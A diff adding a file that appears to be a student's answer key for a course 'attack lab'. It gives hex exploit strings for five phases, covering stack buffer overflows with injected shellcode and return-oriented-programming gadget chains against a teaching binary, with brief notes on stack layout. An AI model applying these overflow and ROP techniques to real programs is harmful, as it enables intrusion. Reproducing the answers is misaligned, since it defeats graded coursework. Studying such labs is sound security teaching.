@@ -1,0 +1,61 @@
+/* Solution for phase 1 */
+/*
+66 66 66 66 66 66 66 66  
+66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 
+66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 
+c0 17 40 00 
+*/
+
+/* Solution for phase 2 */
+/* Take aways:
+ * 1. instruction are read from low address to high address (as refering to ATT format);
+ * 2. stack grow downwards and return upwards;
+ * 3. address use 0x10i (16) bytes location to store return address;
+ * 
+ * Instruction Mapping 
+ * 48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
+ * c3 										 retq
+ */
+/*
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+48 c7 c7 fa 97 b9 59 c3 00 00 00 00 00 00 00 00  
+00 00 00 00 00 00 00 00 88 dc 61 55 00 00 00 00 
+ec 17 40 00 00 00 00 00 
+*/
+
+/* Solution for phase 3 */
+/* Use the veneer (So i called a middleware) to pass pointer of String to %rdi */
+/*
+35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 
+48 c7 c7 78 dc 61 55 c3 00 00 00 00 00 00 00 00  
+00 00 00 00 00 00 00 00 88 dc 61 55 00 00 00 00 
+fa 18 40 00 00 00 00 00 
+*/
+
+/* Solution for phase 4 */
+/* 0x59b997fa -> %rax -> %rdi */
+/*
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  
+00 00 00 00 00 00 00 00 cc 19 40 00 00 00 00 00 
+fa 97 b9 59 00 00 00 00 c5 19 40 00 00 00 00 00 
+ec 17 40 00 00 00 00 00 
+*/
+
+/* Solution for phase 5 */
+
+/* Take aways:
+ * Take a look at the gadgets provided, not all are useless (need trim)
+ */
+
+/*
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  
+00 00 00 00 00 00 00 00 06 1a 40 00 00 00 00 00 /* offset x */
+c5 19 40 00 00 00 00 00 cc 19 40 00 00 00 00 00 /* offset y */
+48 00 00 00 00 00 00 00 dd 19 40 00 00 00 00 00 /* eax -> edx */
+69 1a 40 00 00 00 00 00 13 1a 40 00 00 00 00 00 /* edx -> ecx -> esi */
+d6 19 40 00 00 00 00 00 c5 19 40 00 00 00 00 00 /* x + y -> rax -> rdi */
+fa 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 
+*/
+
